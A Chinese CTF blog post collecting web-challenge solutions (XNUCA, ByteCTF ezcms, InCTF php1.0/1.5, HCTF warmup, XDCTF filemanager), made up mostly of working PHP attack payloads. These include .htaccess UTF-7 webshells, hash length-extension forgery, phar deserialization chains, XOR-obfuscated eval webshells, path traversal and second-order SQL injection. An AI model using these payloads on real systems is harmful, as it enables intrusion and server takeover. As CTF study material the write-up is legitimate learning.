# 前言

记录一些平时在CTF中遇到的一些skill





# 正文

## 0x01

参考文章：[XNUCA 2019 Qualifier的两个web题目writeup](https://www.anquanke.com/post/id/185377)

根据文章描述这道题，考察上传文件，`index.php`有一个写文件的功能且只能写文件名为`[a-z.]*` 的文件，且文件内容存在黑名单过滤，并且结尾被加上了一行，这就导致我们无法直接写入`.htaccess`里面`auto_prepend_file`等php_value。







最后的payload为

```txt
Step1 写入.htaccess error_log相关的配置：

php_value include_path "/tmp/xx/+ADw?php die(eval($_GET[2]))+ADs +AF8AXw-halt+AF8-compiler()+ADs"
php_value error_reporting 32767
php_value error_log /tmp/fl3g.php
# 

Step2 访问index.php留下error_log

Step3 写入.htaccess新的配置
php_value zend.multibyte 1
php_value zend.script_encoding "UTF-7"
php_value include_path "/tmp"
# 

Step4 再访问一次index.php?2=evilcode即可getshell.
```





## 0x02

记录byteCTF2019的解题思路

### 前言

这次比赛给自己一个警醒，想要进步就不能胆怯，不管题目多难，都要去尝试，拼了命去尝试，不能懒，不能怕。明明告诉自己，怕就已经输了......



### ezcms

#### 第一部分

这道题考察hashpump，php反序列化(通过phar实现)

扫描目录获得源码，ｗｗｗ.zip，审计源码

```php
//index.php
<?php
error_reporting(0);
include('config.php');
if (isset($_POST['username']) && isset($_POST['password'])){
    $username = $_POST['username'];
    $password = $_POST['password'];
    $username = urldecode($username);
    $password = urldecode($password);
    if ($password === "admin"){
        die("u r not admin !!!");
    }
    $_SESSION['username'] = $username;
    $_SESSION['password'] = $password;

    if (login()){
        echo '<script>location.href="upload.php";</script>';
    }
}
```

跟进login()函数：

```php
//config.php
function login(){

    $secret = "********";
    setcookie("hash", md5($secret."adminadmin"));
    return 1;
}
```

生成一段`hash`，然后这里就用到了我们的hash拓展攻击，可以看出这是一段８位的密文

burp抓包将会获取一段hash值，当我们登录后，到`upload.php`

```php
<?php
include ("config.php");
if (isset($_FILES['file'])){
    $file_tmp = $_FILES['file']['tmp_name'];
    $file_name = $_FILES['file']['name'];
    $file_size = $_FILES['file']['size'];
    $file_error = $_FILES['file']['error'];
    if ($file_error > 0){
        die("something error");
    }
    $admin = new Admin($file_name, $file_tmp, $file_size);
    $admin->upload_file();
}else{
    $sandbox = 'sandbox/'.md5($_SERVER['REMOTE_ADDR']);
    if (!file_exists($sandbox)){
        mkdir($sandbox, 0777, true);
    }
    if (!is_file($sandbox.'/.htaccess')){
        file_put_contents($sandbox.'/.htaccess', 'lolololol, i control all');
    }
    echo "view my file : "."<br>";
    $path = "./".$sandbox;
    $dir = opendir($path);
    while (($filename = readdir($dir)) !== false){
        if ($filename != '.' && $filename != '..'){
            $files[] = $filename;
        }
    }
    foreach ($files as $k=>$v){
        $filepath = $path.'/'.$v;
        echo <<<EOF
        <div style="width: 1000px; height: 30px;">
        <Ariel>filename: {$v}</Ariel>
        <a href="view.php?filename={$v}&filepath={$filepath}">view detail</a>
</div>
EOF;
    }
    closedir($dir);

}
```

关键函数：

```php
    $admin = new Admin($file_name, $file_tmp, $file_size);
    $admin->upload_file();
```



看到`Admin`类:

```php
 $this->checker = $profile->is_admin();
 ...
 //Profile类
 public function is_admin(){
        $this->username = $_SESSION['username'];
        $this->password = $_SESSION['password'];
        $secret = "********";
        if ($this->username === "admin" && $this->password != "admin"){
            if ($_COOKIE['user'] === md5($secret.$this->username.$this->password)){
                return 1;
            }
        }
        return 0;

  }
```



这里的关键代码：

```php
        $secret = "********";
        if ($this->username === "admin" && $this->password != "admin"){
            if ($_COOKIE['user'] === md5($secret.$this->username.$this->password)){
                return 1;
            }
        }
```

上传文件时得是admin才能上传文件，验证的方式是通过`$_COOKIE['user']`和`md5($secret.$this->username.$this->password)`进行验证，这两个东西，我们可以通过hash拓展进行伪造

```
hashpump -s "52107b08c0f3342d2153ae1d68e6262c" -d adminadmin -k 8 -a admin123
$_COOKIE['user']:da87617c23790ab325af3e593dbc093c
username:admin
password:admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00admin123

admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admin123
```

然后登录，上传文件时得记得带上$_COOKIE['user']，这样就能上传文件了。



####　第二部分

当我们在访问upload.php时将会生成一个.htaccess文件。由于这个文件里面的内容被服务器写死了，所以我们上传的马无法被正常地解析，所以我们要做的就是给.htaccess做手脚。

```php
<?php
error_reporting(0);
include ("config.php");
$file_name = $_GET['filename'];
$file_path = $_GET['filepath'];
$file_name=urldecode($file_name);
$file_path=urldecode($file_path);
$file = new File($file_name, $file_path);
$res = $file->view_detail();
$mine = $res['mine'];
$store_path = $res['store_path'];
```

跟进view_detail()

```php
    public function view_detail(){
        if      (preg_match('/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i', $this->filepath))
        {
            die("nonono~");
        }
        $mine = mime_content_type($this->filepath);
        $store_path = $this->open($this->filename, $this->filepath);
        $res['mine'] = $mine;
        $res['store_path'] = $store_path;
        return $res;
    }
```

这里的`mime_content_type()`函数将会触发phar引起的反序列化漏洞。

```php
class File{

    public $checker;

    function __construct($filename, $filepath)
    {
        $this->filepath = $filepath;
        $this->filename = $filename;
    }
    ... ... 
    function __destruct()
    {
        if (isset($this->checker)){
            $this->checker->upload_file();
        }
    }
}
```

这里的`$checker`是我们可控的。

```php
class Profile{

    public $username;
    public $password;
    public $admin;

    public function is_admin(){
        $this->username = $_SESSION['username'];
        $this->password = $_SESSION['password'];
        $secret = "********";
        if ($this->username === "admin" && $this->password != "admin"){
            if ($_COOKIE['user'] === md5($secret.$this->username.$this->password)){
                return 1;
            }
        }
        return 0;

    }
    function __call($name, $arguments)
    {
        $this->admin->open($this->username, $this->password);
    }
}
```

当调用该类中的一个不存在的函数时，将会触发`__call()`魔术方法，可奇怪的是这个类中并没有`open()`函数，考虑到可能内置类的函数。

参考链接：[https://www.php.net/manual/tr/function.ziparchive-open.php](https://www.php.net/manual/tr/function.ziparchive-open.php)



**ZIPARCHIVE::OVERWRITE** ([integer](https://www.php.net/manual/zh/language.types.integer.php))

总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖。

所以我们可以通过设置$filename为`.htaccess`的路径，然后通过这个办法将其覆盖。

```php
<?php
class File
{
    public $filename;
    public $filepath;
    public $checker;
    function __construct()
    {
        $this->checker = new Profile();
    }
    function __destruct()
    {
        if (isset($this->checker)) {
            $this->checker->upload_file();
        }
    }
}
class Profile
{
    public $username;
    public $password;
    public $admin;
    function __construct()
    {
        $this->admin = new ZipArchive();
        $this->username = '/var/www/html/sandbox/0a8a3ff9ed88d2847af85fde49c7e9ae/.htaccess';
        $this->password = ZIPARCHIVE::OVERWRITE;
    }
    function __call($name, $arguments)
    {
        $this->admin->open($this->username, $this->password);
    }
}
@unlink("test.phar");
$phar = new Phar("43.phar");
//后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER();?>");
//设置stub
$o = new File();
$phar->setMetadata($o);
//将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test");
//添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
```

上传該phar文件。访问該文件。使得解除`.htaccess`被写乱的现状。

访问該链接，就是为了触发phar反序列化漏洞。

```
http://112.126.102.158:9999/view.php?filename=&filepath=php://filter/convert.base64-
encode/resource=phar://sandbox/0a8a3ff9ed88d2847af85fde49c7e9ae/dab4372519226a4dccef3b43f41200c1.phar
```

使用`filter://`是为了绕过黑名单



接着上传木马

```php
<?php
var_dump(file_get_contents("/flag"));
?>
```



访问链接：

```
http://112.126.102.158:9999/sandbox/0a8a3ff9ed88d2847af85fde49c7e9ae/71c31cca71459cafdb161a3f63a6fdc7.php
```

获得flag





## 0x03

浙大的一道题，主要考察session反序列化，session.upload_progress.enabled的使用，这个我觉得算是一个小trick。

题目地址：[http://web.jarvisoj.com:32784/](http://web.jarvisoj.com:32784)

源码：

```php
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }
    
    function __destruct()
    {
        eval($this->mdzz);
    }
}
if(isset($_GET['phpinfo']))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents('index.php'));
}
?>
```

使用反序列化的话，一旦控制了`$mdzz`，我们们就可以通过`_destruct()`，进行文件读取。



在php.ini中设置的是session处理器是`php_serialize`，然后在这道题中设置的session处理器又是`php`，这里的处理器差异导致反序列化漏洞。

[HP Session 序列化及反序列化处理器设置使用不当带来的安全隐患](https://github.com/80vul/phpcodz/blob/master/research/pch-013.md)

[深入浅析PHP的session反序列化漏洞问题](https://www.jb51.net/article/116246.htm)

我们先构造payload

```php
<?php

class OowoO
{
    public $mdzz = "var_dump(file_get_contents('/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php'));";
}

$m = new OowoO();
echo serialize($m);
//|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}
//|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:89:\"var_dump(file_get_contents('/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php'));\";}
?>
```

然后我们构造的payload该如何进入session中，使其能够被`session处理器 php`处理。



session.upload_progress.enable是开启的。**意味着当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。**



我觉得这个trick，我是想不到，因为对php.ini的配置还不是很熟.....

```
<!DOCTYPE html>
<html>
<head>
	<title>test XXE</title>
	<meta charset="utf-8">
</head>
<body>
	<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
	    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
	    <input type="file" name="file" />
	    <input type="submit" value="go" />
	</form>
</body>
</html>

```

我们POST一个表单，表单名为`PHP_SESSION_UPLOAD_PROGRESS`，然后我们就能将我们的payload带入`SESSION`







## 0x04

### InCTF的php1.0

```php
<?php

$input = $_GET['input'];

function check(){
  global $input;
  foreach (get_defined_functions()['internal'] as $blacklisted) {
      if (preg_match ('/' . $blacklisted . '/im', $input)) {
          echo "Your input is blacklisted" . "<br>";
          return true;
          break;
      }
  }
  $blacklist = "exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\{|\}|\"|\'";
  unset($blacklist);
  return false;
}

$thisfille=$_GET['thisfile'];

if(is_file($thisfille)){
  echo "You can't use inner file" . "<br>";
}
else{
  if(file_exists($thisfille)){
    if(check()){
      echo "Naaah" . "<br>";
    }else{
      eval($input);
    }
  }else{
    echo "File doesn't exist" . "<br>";
  }

}

function iterate($ass){
    foreach($ass as $hole){
        echo "AssHole";
    }
}

highlight_file(__FILE__);
?>
```

这是一道代码审计题，第一个点就是绕过`file_exists()`还有`is_file()`函数，payload是`thisfile=/var`使用目录就能绕过。

之后就是`check()`函数

```php
function check(){
  global $input;
  foreach (get_defined_functions()['internal'] as $blacklisted) {
      if (preg_match ('/' . $blacklisted . '/im', $input)) {
          echo "Your input is blacklisted" . "<br>";
          return true;
          break;
      }
  }
  $blacklist = "exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\{|\}|\"|\'";
  unset($blacklist);
  return false;
}
```

这个就特别狠了，把所有的内置函数都给干掉了.......

只要能绕过这个，我们就能进行命令执行...... 想起之前SUCTF使用异或进行命令执行.......

那时的payload为：

```
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
```

我们一把梭过去，发现可以.....





接着payload2

```
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%27/etc/passwd%27);&%ff=show_source&thisfile=/var
```



可是读不了`/flag`估计是给了权限让我们无法访问。

我们会发现一个问题**由于eval()函数存在一个特性，它只执行一次**，而**${}**中的变量为可变变量，所以如果我们向上面那样写shell的话，就不得不向上面那样构造phpinfo(),show_source(),这样的函数，那这样的话，绝对无法getshell。

最后修改payload为

```
$b=${%a0%af%b0%ac%ab^%ff%ff%ff%ff%ff}[a];eval($b);&thisfile=/var
```

我们多加了一个`eval()`，将payload嵌套在其中，这样子就能够构造eval($_POST[a]);最后getshell。

**另外还有两个姿势用来绕过**

**其一：使用字符串拼接**

```php
payload1:thisfile=/var&input=eval('php'.'info();');
```

```php
payload2:thisfile=/var&input=$b=p.h.p.i.n.f.o;$b();
```

**其二：使用os命令**

这道题中，我们查看phpinfo()，会发现这里的`proc_open()`没有被过滤，那这个函数就可以用。

参考文章：[https://www.php.net/manual/zh/function.proc-open.php](https://www.php.net/manual/zh/function.proc-open.php)



这里附上张师傅的payload，tql.....

```php
input=$descr=array(0=>array('p'.'ipe','r'),1=>array('p'.'ipe','w'),2=>array('p'.'ipe','w
'));$pxpes=array();$process=eval('return
proc'.$thisfille[8].'open("/readFlag",$descr,$pxpes);');eval('echo(s'.'t'.'r'.'e'.'a'.'m
'.$thisfille[8].'g'.'e'.'t'.$thisfille[8].'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s($pxpes[1]));');
&thisfile=/var
```





### InCTF的php1.5

```php
<?php

$input = $_GET['input'];

function check(){
  global $input;
  foreach (get_defined_functions()['internal'] as $blacklisted) {
      if (preg_match ('/' . $blacklisted . '/im', $input)) {
          echo "Your input is blacklisted" . "<br>";
          return true;
          break;
      }
  }
  $blacklist = "exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\{|\}|\"|\'";
  if(preg_match("/$blacklist/i", $input)){
    echo "Do you really you need that?" . "<br>";
    return true;
  }

  unset($blacklist);
  return false;
}

$thisfille=$_GET['thisfile'];

if(is_file($thisfille)){
  echo "You can't use inner file" . "<br>";
}
else{
  if(file_exists($thisfille)){
    if(check()){
      echo "Naaah" . "<br>";
    }else{
      eval($input);
    }
  }else{
    echo "File doesn't exist" . "<br>";
  }

}

function iterate($ass){
    foreach($ass as $hole){
        echo "AssHole";
    }
}
highlight_file(__FILE__);
?>
```

与warmup相比，这里过滤掉了

```php
$blacklist = "exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\{|\}|\"|\'";
```

然后前面的写shell的方法就不可以使用

我直接上学长给我的payload吧，tql.....

```php
input=$b=%a0%af%b0%ac%ab^%ff%ff%ff%ff%ff;$a=$$b;$c=e.n.d;$f=$c($a);$d=a.s.s.e.r.t;$d($f);&thisfile=/var
```

随便post一个参数上去，使用antsword就能getshell

```php
p=phpinfo()
```



## 0x05

HCTF2018的warmup

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }
            
            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')//
            );
            if(in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?> 
```

这道题来自于phpMyadmin之前的一个漏洞[https://www.freebuf.com/vuls/176064.html](https://www.freebuf.com/vuls/176064.html)

`checkFile()`中的三个验证，只要有一个符合就能返回true。

这里第三个检验是存在漏洞的

```php
            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
```

这里给出的payload为：

```php
file=hint.php%253f/../../../../../../../../ffffllllaaaagggg
```

构造这样的payload是为了绕过白名单过滤并且使得文件包含有效。

在第三个检验时，`%253f`转`%3f`转`?`

在文件包含时，包含的文件如下:

```php
hint.php%3f/../../../../../../../../ffffllllaaaagggg
```

如果这里的文件名仅仅是

```php
hint.php?/../../../../../../../../ffffllllaaaagggg
```

那么这里的`/../../../../../../../../ffffllllaaaagggg`就被作为传入`hint.php`的参数，无法正常进行目录穿越。



## 0x06

[XDCTF 2015]filemanager

访问www.tar.gz下载源码

审计源码，首先上传一个文件，看到upload.php

![](/home/cookie/Pictures/blogs/CTF杂谈随笔/1.png)

在文件未上传的情况下，上传文件，将会在数据库中插入文件名和文件后缀。



接着看到rename.php

![](/home/cookie/Pictures/blogs/CTF杂谈随笔/2.png)



```markdown
(1)上传一个info',extension='.jpg
(2)insert into `file` ( `filename`, `view`, `extension`) values( 'info',extension='', 0, 'jpg')
(3)rename时获取到后缀名$result["extension"]=jpg
(4)执行update `file` set `filename`='test.jpg',oldname='info',exetension='' where fid=1
(5)上传的文件名改为test.jpg.jpg，数据库中extension更改为空
(6)上传一个test.jpg(真正的shell),
(7)更名为shell.php,当数据库查找文件名为test.jpg时，获得后缀名为空
(8)执行update,获得shell.php
```
具体操作如下

![](/home/cookie/Pictures/blogs/CTF杂谈随笔/3.png)



![](/home/cookie/Pictures/blogs/CTF杂谈随笔/4.png)





![](/home/cookie/Pictures/blogs/CTF杂谈随笔/5.png)



![](/home/cookie/Pictures/blogs/CTF杂谈随笔/6.png)



![](/home/cookie/Pictures/blogs/CTF杂谈随笔/7.png)